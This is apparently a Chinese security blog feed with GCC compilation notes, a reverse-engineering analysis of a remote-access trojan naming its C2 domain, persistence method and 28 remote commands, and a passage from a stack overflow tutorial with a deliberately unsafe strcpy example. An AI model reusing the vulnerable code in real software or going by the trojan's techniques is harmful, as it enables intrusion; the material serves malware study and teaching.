    <content type="html"><![CDATA[<h2 id="从源码到可执行文件"><a href="#从源码到可执行文件" class="headerlink" title="从源码到可执行文件"></a>从源码到可执行文件</h2><p>我们平时接触到的都是高级语言，比如C语言，而当它真正在操作系统上执行的时候，每一条C语句都会被翻译成一系列的低级机器语言指令。最后，这些指令按照可执行文件的格式打包，并以二进制的形式存放起来。</p><h3 id="编译原理"><a href="#编译原理" class="headerlink" title="编译原理"></a>编译原理</h3><p>编译器的作用就是读入以某种语言（源语言）编写的程序，输出等价的用另一种语言（目标语言）编写的程序。编译器可以分为前端和后端。前段主要将源程序分解成组成要素和相应的语法结构，通过这个结构创建源程序的中间表示，同时收集和源程序相关的信息，存放到符号表之中；后端与机器相关，主要是根据中间表示和符号表信息构造目标程序。</p><p>编译过程可以大致分为以下五个步骤</p><ol><li>词法分析：读取源程序的字符流，输出为有意义的词素；</li><li>语法分析：根据各个词法单元的第一个分量来创建树型的中间表示形式，通常是语法树；</li><li>语义分析：使用语法树和符号表中的信息，检测源程序是否满足语言定义的语义约束，同时收集类型信息，用于代码生成，类型检查和类型转换；</li><li>中间代码生成和优化：根据语义分析输出，生成类机器语言的中间表示，如三地址码，然后对生成的中间代码进行分析和优化；</li><li>代码生成和优化：把中间表示形式映射到目标机器语言。</li></ol><h3 id="GCC编译过程"><a href="#GCC编译过程" class="headerlink" title="GCC编译过程"></a>GCC编译过程</h3><p>在linux中，使用以下指令完成源程序到目标程序的转化</p><figure class="highlight llvm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs llvm">gcc hello.<span class="hljs-keyword">c</span> -o hello<br></code></pre></div></td></tr></table></figure><p>GCC编译器读取hello.c，经过预处理、编译、汇编、链接四个步骤，将其翻译成了可执行目标程序hello。</p><p>用这段代码来做示例</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world\n&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="预处理阶段"><a href="#预处理阶段" class="headerlink" title="预处理阶段"></a>预处理阶段</h4><p>GCC编译的第一个阶段是预处理阶段，主要是处理源代码中以<code>#</code>开始的预处理指令，比如</p><blockquote><p>#include </p><p>#define</p></blockquote><p>将其转换后直接插入程序文本之中，得到另一个C程序，通常以“.i”作为文件扩展名。在命令行中添加编译选项<code>-E</code>可以单独执行预处理</p><figure class="highlight llvm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs llvm">gcc -E hello.<span class="hljs-keyword">c</span> -o hello.i<br></code></pre></div></td></tr></table></figure><p>预处理的规则如下：</p><ul><li>将所有的#define删除，并且展开所有的宏定义</li><li>处理所有条件预编译指令，比如#if、#ifdef、#elif、#else、#endif</li><li>处理#include预编译指令，将被包含的文件插入到该预编译指令的位置。</li><li>删除所有的注释</li><li>添加行号和文件名标识，比如# 2 “hello.c” 2，以便于编译时编译器产生调试用的行号信息及用于编译时产生错误或警告时能够显示行号</li><li>保留所有的#pragma编译器指令，因为编译器需要使用它们</li></ul><p>部分hello.i内容如下图所示</p><p><img src="/2021/10/26/%E4%BB%8E%E6%BA%90%E7%A0%81%E5%88%B0%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/1.png"></p><h4 id="编译阶段"><a href="#编译阶段" class="headerlink" title="编译阶段"></a>编译阶段</h4><p>GCC的第二阶段是编译，该阶段将预处理文件进行一系列的词法分析、语法分析、语义分析以及优化，最终生成汇编代码。添加<code>-S</code>选项，是编译选项。操作对象可以是源代码hello.c也可以是预处理文件hello.i。实际上在GCC的实现中，已经将预处理和编译合并处理。</p><figure class="highlight nginx"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">gcc</span> -S hello.i -o hello.s<br></code></pre></div></td></tr></table></figure><p>hello.s文件内容如下</p><p><img src="/2021/10/26/%E4%BB%8E%E6%BA%90%E7%A0%81%E5%88%B0%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/2.png"></p><p>其中生成的汇编代码，<code>printf</code>函数被替换成了<code>puts</code>函数，这是因为当<code>printf</code>只有单一参数时，与<code>puts</code>是十分类似，所以GCC的优化策略将其替换提高性能。</p><h4 id="汇编阶段"><a href="#汇编阶段" class="headerlink" title="汇编阶段"></a>汇编阶段</h4><p>GCC第三个阶段是汇编，汇编器根据汇编指令与机器指令的对照表进行翻译，将hello.s汇编成目标文件hello.o。在命令行中添加编译选项<code>-c</code>，操作对象可以是hello.c也可以是hello.s。</p><figure class="highlight llvm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs llvm">gcc -<span class="hljs-keyword">c</span> hello.s -o hello.o<br></code></pre></div></td></tr></table></figure><p>此时hello.o文件是一个可重定位文件</p><p><img src="/2021/10/26/%E4%BB%8E%E6%BA%90%E7%A0%81%E5%88%B0%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/3.png"></p><p>可以使用objdump命令查看内容</p><p><img src="/2021/10/26/%E4%BB%8E%E6%BA%90%E7%A0%81%E5%88%B0%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/4.png"></p><p>因为此时还没有进行链接，所以看到一些地址都是被设置为了0</p><h4 id="链接阶段"><a href="#链接阶段" class="headerlink" title="链接阶段"></a>链接阶段</h4><p>GCC编译的第四个阶段是链接，可以分为静态链接和动态链接两种。GCC默认使用动态链接，添加编译选项<code>-static</code>可以指定使用静态链接。这一阶段将目标文件及其依赖库进行链接，生成可执行文件，主要包括地址和空间分配、符号绑定和重定位等操作。</p><figure class="highlight nginx"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">gcc</span> hello.o -o hello<br></code></pre></div></td></tr></table></figure><p>链接操作由链接器（ld.so）完成，结果就会得到hello，这是一个可执行文件</p><p><img src="/2021/10/26/%E4%BB%8E%E6%BA%90%E7%A0%81%E5%88%B0%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/5.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/kele-dad/p/9490640.html">https://www.cnblogs.com/kele-dad/p/9490640.html</a></p><p><a href="https://www.linuxidc.com/Linux/2016-09/135473.htm">https://www.linuxidc.com/Linux/2016-09/135473.htm</a></p><p>《CTF竞赛权威指南（PWN篇）》</p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN</tag>
      
      <tag>读书笔记</tag>
      
      <tag>GCC编译原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>X绒面试题</title>
    <link href="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
    <url>/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>正好拿到了一个X绒的面试题，来分析一下看看。</p><h2 id="样本的信息"><a href="#样本的信息" class="headerlink" title="样本的信息"></a>样本的信息</h2><ul><li>名称：c7d46a908d692a89f2e8e1303137f8d7a8d7e7ac</li><li>MD5：2f02e4a81dd4ff32270ed31429fd88d1</li><li>SHA256：b7e98515a01b4c77a5ae97742338a51b325e7362e3f2976f252afb126ad6d3fa</li><li>样本大小：122880字节</li></ul><h2 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h2><h3 id="火绒剑行为分析"><a href="#火绒剑行为分析" class="headerlink" title="火绒剑行为分析"></a>火绒剑行为分析</h3><p>使用火绒剑监控行为，过滤行为，只看文件创建和写入，可以看到首先创建了在C:\Program Files下创建了一个Windows Cyguof文件夹，然后在其中创建一个svchost.exe。</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/1.png"></p><p>再过滤注册表的set value，可以看到创建了几个键值，这几个是与windows服务有关的，那么应该是创建了一个服务来实现持久化驻留。</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/2.png"></p><p>注册表相关信息</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/3.png"></p><p>创建的服务</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/4.png"></p><p>伪装成svchost的样本</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/5.png"></p><h3 id="IDA-OD"><a href="#IDA-OD" class="headerlink" title="IDA+OD"></a>IDA+OD</h3><p>样本全程使用LoadLibrary+GetProcAddress的方式，动态加载。</p><p>获取一些API地址</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/6.png"></p><p>首先，会解密一些内容</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/7.png"></p><p>其中部分密文</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/8.png"></p><p>解密算法</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/9.png"></p><p>解密出来的结果</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/10.png"></p><p>第一个是C2的域名，第二个是注册表的表项名。</p><p>拼接完成一个路径C:\ProgramFiles\Windows Cyguof\svchost.exe</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/11.png"></p><p>然后会尝试打开注册表并且查询其中键值的值</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/12.png"></p><p>获取当前程序的运行路径，比较其是否为C:\ProgramFiles\Windows Cyguof\svchost.exe</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/13.png"></p><p>如果是非C:\ProgramFiles\Windows Cyguof\svchost.exe这个路径，那么就会执行下面这些操作。</p><p>会根据一个算法来生成三个值在注册表中要用到的值</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/14.png"></p><p>通过GetTickCount和一些运算生成值</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/15.png"></p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/16.png"></p><p>进行注册表的设置，创建HKLM\SYSTEM\CurrentControlSet\Services\Wsviss uasouavk\ReleiceName，设置值为刚才生成的那个数。</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/17.png"></p><p>注册表相关操作</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/18.png"></p><p>然后是设置具体的服务</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/19.png"></p><p>判断C:\Program Files\Windows Cyguof是否存在，不存在创建且使用CopyFileA复制自身到此文件夹下面，命名为svchost。</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/20.png"></p><p>使用_access判断文件夹是否存在，如果不存在会调用CreateDirectoryA创建。</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/21.png"></p><p>使用CreateServiceA创建服务</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/22.png"></p><p>参数服务的参数</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/23.png"></p><p>StartServiceA会启动服务</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/24.png"></p><p>遍历进程，查找是否存在svchost进程</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/25.png"></p><p>之后就ExitProcess</p><p>然后来看看如果是svchost.exe的时候</p><p>主要执行这部分操作，可以看到关键的函数主要是<code>sub_40C920</code>，主要就是执行了它</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/26.png"></p><p>首先，是提权，查看是否当前进程是否具有SeDebugPrivilege权限，如果没有，就会调用AdjustTokenPrivileges提权。</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/27.png"></p><p>创建一个事件，通过getlasterror返回值来判断是否已经在运行，防止重复运行。</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/29.png"></p><p>创建的事件，名为Imdgss czsyi</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/28.png"></p><p>之后会进行网络连接，连接到C2</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/31.png"></p><p>socket连接，域名为hask.f3322.org</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/32.png"></p><p>上面<code>40E990</code>是一个创建线程的函数，也就是CreateThread，远控部分在创建的新线程<code>4021B0</code>中，关于远控部分最后再说。</p><p>在<code>sub_408ED0</code>中会获取一些信息并发送，CPU的信息</p><p>经过查询，注册表HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0，里面包含的主要是CPU相关信息</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/33.png"></p><p>getsockname获取socket信息</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/34.png"></p><p>GetVersionExA获取操作系统版本信息</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/35.png"></p><p>GetSystemInfo获得操作系统信息</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/36.png"></p><p>GetDiskFreeSpaceExA获得磁盘容量信息</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/37.png"></p><p>capGetDriverDescriptionA函数，查询了此函数后，好像是与摄像头有关的API，猜测可能是操控被控端的摄像头的。</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/42.png"></p><p>GetTickCount获得开机到现在时间</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/38.png"></p><p>还有一些注册表中的信息</p><p>获得的所有信息在内存中</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/39.png"></p><p>然后会经过两次加密，再在头部加上一些东西后就会发送到服务端。</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/40.png"></p><p>通过send函数发送内容。</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/41.png"></p><p>通过fakenet模拟网络生成的PCAP包，可以看到具体发送的内容</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/43.png"></p><h3 id="远控部分"><a href="#远控部分" class="headerlink" title="远控部分"></a>远控部分</h3><p>远控部分是在这个创建的线程之中</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/50.png"></p><p>在这里可以看到当<code>recv</code>函数收到数据的时候，会调用<code>sub_4022B0</code>，而这个函数中是一些解密函数以及具体的远控部分，所以接收到的信息是加密的，经过解密后进入远控函数。</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/85.png"></p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/86.png"></p><p><code>sub_405060</code>函数是接收指令，且执行操作的地方，执行的操作大概有28种</p><p>通过switch语句进行判断，并且执行相应的操作</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/51.png"></p><p>这里的命令应该是数字。按照顺序来看，从数字1开始看</p><h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/52.png"></p><p>它会尝试访问C:\Windows\system\Consys02.dll这个文件，然后执行操作，但是这个文件现在不存在，所以这个DLL做了什么不知道，只能根据名字来进行猜测DLLFILE应该是文件相关操作。所有读取了DLL的功能，全部都是需要比较指定位置的字符串是否等于<code>SSSSSS</code>和<code>VID:2013-SV1</code>，并且内存加载执行的，所以没有DLL的情况下，这些功能只能通过名字来进行猜测。</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/53.png"></p><h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><p>DLLScreen应该是屏幕截图</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/54.png"></p><h4 id="3"><a href="#3" class="headerlink" title="3"></a>3</h4><p>DllVideo与视频相关，可能是摄像头操作，或是桌面录制</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/55.png"></p><h4 id="4"><a href="#4" class="headerlink" title="4"></a>4</h4><p>DllKeybo应该是键盘的记录</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/56.png"></p><h4 id="5"><a href="#5" class="headerlink" title="5"></a>5</h4><p>DllAudio与音频有关，可能是录音</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/57.png"></p><h4 id="6"><a href="#6" class="headerlink" title="6"></a>6</h4><p>DllSyste应该与系统有关</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/58.png"></p><h4 id="7"><a href="#7" class="headerlink" title="7"></a>7</h4><p>DllShell可能会执行一些shell命令</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/59.png"></p><h4 id="8"><a href="#8" class="headerlink" title="8"></a>8</h4><p>提升SeShutdownPrivilege权限，调用ExitWindowsEx注销系统</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/60.png"></p><h4 id="9"><a href="#9" class="headerlink" title="9"></a>9</h4><p>首先删除C:\Windows\system32\ourlog.dat</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/61.png"></p><p>创建VBS文件且执行，名字是根据GetTickCount生成的。</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/62.png"></p><p>VBS脚本的内容，可以看到应该是删除了原文件</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/63.png"></p><h4 id="10"><a href="#10" class="headerlink" title="10"></a>10</h4><p>会尝试下载一个文件</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/64.png"></p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/65.png"></p><p>然后会尝试执行</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/66.png"></p><h4 id="11"><a href="#11" class="headerlink" title="11"></a>11</h4><p>会访问HKEY_CLASSES_ROOT\Applications\iexplore.exe\shell\open\command中的值</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/67.png"></p><p>然后会执行程序</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/68.png"></p><h4 id="12"><a href="#12" class="headerlink" title="12"></a>12</h4><p>与上面相同</p><h4 id="13"><a href="#13" class="headerlink" title="13"></a>13</h4><p>设置注册表</p><p>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\生成的那个服务名字</p><p>设置其中的HOST值</p><h4 id="14"><a href="#14" class="headerlink" title="14"></a>14</h4><p>设置HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\生成的那个服务名字中的ConnectGroup值</p><h4 id="15"><a href="#15" class="headerlink" title="15"></a>15</h4><p>创建一个EXE，接受的数据写入其中，然后执行它，exe名字也是根据GetTickCount生成</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/69.png"></p><h4 id="16"><a href="#16" class="headerlink" title="16"></a>16</h4><p>与上面一样</p><h4 id="17"><a href="#17" class="headerlink" title="17"></a>17</h4><p>与上面一样，但是只会创建，不会执行，这里第三个参数是2</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/70.png"></p><p>这里不等于2才执行</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/71.png"></p><h4 id="18"><a href="#18" class="headerlink" title="18"></a>18</h4><p>会实现一个弹窗，窗口内容和标题都是接收到的数据</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/72.png"></p><h4 id="19"><a href="#19" class="headerlink" title="19"></a>19</h4><p>会下载DLL</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/73.png"></p><h4 id="20"><a href="#20" class="headerlink" title="20"></a>20</h4><p>DLLSerSt，根据名字不好猜测具体作用</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/74.png"></p><h4 id="21"><a href="#21" class="headerlink" title="21"></a>21</h4><p>DLLSerMa</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/75.png"></p><h4 id="22"><a href="#22" class="headerlink" title="22"></a>22</h4><p>DllReg应该是注册表相关</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/76.png"></p><h4 id="23"><a href="#23" class="headerlink" title="23"></a>23</h4><p>DllDdosOpen应该是打开DDOS功能</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/77.png"></p><h4 id="24"><a href="#24" class="headerlink" title="24"></a>24</h4><p>关闭DDOS功能</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/78.png"></p><h4 id="25"><a href="#25" class="headerlink" title="25"></a>25</h4><p>开启代理，应该会拦截获取所有的上网数据</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/79.png"></p><h4 id="26"><a href="#26" class="headerlink" title="26"></a>26</h4><p>关闭代理</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/80.png"></p><h4 id="27"><a href="#27" class="headerlink" title="27"></a>27</h4><p>查找指定的进程，找到后会加密发送一些信息给服务器。</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/81.png"></p><p>进程遍历查找</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/82.png"></p><h4 id="28"><a href="#28" class="headerlink" title="28"></a>28</h4><p>查找指定窗口标题的程序，找到后会加密发送一些信息给服务器。</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/83.png"></p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/84.png"></p><h2 id="IOCS"><a href="#IOCS" class="headerlink" title="IOCS"></a>IOCS</h2><h3 id="MD5："><a href="#MD5：" class="headerlink" title="MD5："></a>MD5：</h3><ul><li>2f02e4a81dd4ff32270ed31429fd88d1（exe）</li><li>31802b90fe67a46bed5f3eb0ad6bb8c7（C2地址）</li></ul><h3 id="URL："><a href="#URL：" class="headerlink" title="URL："></a>URL：</h3><ul><li>hask.f3322.org</li></ul>]]></content>
    
    
    <categories>
      
      <category>病毒分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向工程</tag>
      
      <tag>病毒分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>栈溢出原理与实践</title>
    <link href="/2021/10/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/"/>
    <url>/2021/10/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇笔记主要是《0day安全：软件漏洞分析技术》第一章第二篇的笔记，记录下栈溢出的原理和实践</p><h2 id="栈溢出原理与实践"><a href="#栈溢出原理与实践" class="headerlink" title="栈溢出原理与实践"></a>栈溢出原理与实践</h2><p>栈的相关概念就不再介绍了（其实是太懒了，不想再说了，主要搞逆向的对栈应该是非常熟悉了）。</p><h3 id="修改邻接变量"><a href="#修改邻接变量" class="headerlink" title="修改邻接变量"></a>修改邻接变量</h3><p>函数的局部变量在栈中是一个一个挨着排列的，如果在这些局部变量之中有数组之类的缓冲区，并且程序中存在着数组越界的缺陷，那么越界的数组元素就有可能破坏栈中的相邻变量的值，甚至破坏其中保存的EBP值、返回地址等重要数据。</p><p>如图，栈中保存着返回地址，成功覆盖且修改返回地址，指向其他地方就可以执行自己的代码。</p><p><img src="/2021/10/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/1.png"></p><p>现在编写一个简单的例子，来进行说明。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;stdafx.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PASSWORD <span class="hljs-meta-string">&quot;1234567&quot;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">a</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *password)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> iRet;<br><span class="hljs-keyword">char</span> buffer[<span class="hljs-number">8</span>];<br>iRet = <span class="hljs-built_in">strcmp</span>(password,PASSWORD);<br><span class="hljs-built_in">strcpy</span>(buffer,password);<br><span class="hljs-keyword">return</span> iRet;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> iFlag=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">char</span> password[<span class="hljs-number">1024</span>];<br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;please input password\n&quot;</span>);<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>,password);<br>iFlag=a(password);<br><span class="hljs-keyword">if</span>(iFlag)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;wrong\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;right\n&quot;</span>);<br><span 